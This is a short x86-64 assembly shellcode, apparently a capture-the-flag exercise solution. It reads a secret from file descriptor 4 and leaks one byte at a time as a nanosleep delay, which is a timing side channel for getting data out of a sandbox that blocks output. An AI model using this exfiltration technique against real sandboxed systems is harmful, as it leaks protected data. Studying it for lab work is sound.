.global _start
_start:
.intel_syntax noprefix

# read(4, buf, 0x80);
mov rax, 0
mov rdi, 4
lea rsi, [rip+buf]
mov rdx, 0x80
syscall

# t.tv_sec = *(buf+x);
# t.tv_nsec = *(buf+x);
# nanosleep(&req, NULL);
mov rbx, 0
mov bl, BYTE PTR [rip+buf+x]
sub rbx, 33
mov QWORD PTR [rip+tv_sec], rbx
mov QWORD PTR [rip+tv_nsec], 0
mov rax, 35
lea rdi, [rip+tv_sec]
mov rsi, 0
syscall

buf:
.asciz "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
tv_sec:
.quad 0
tv_nsec:
.quad 0
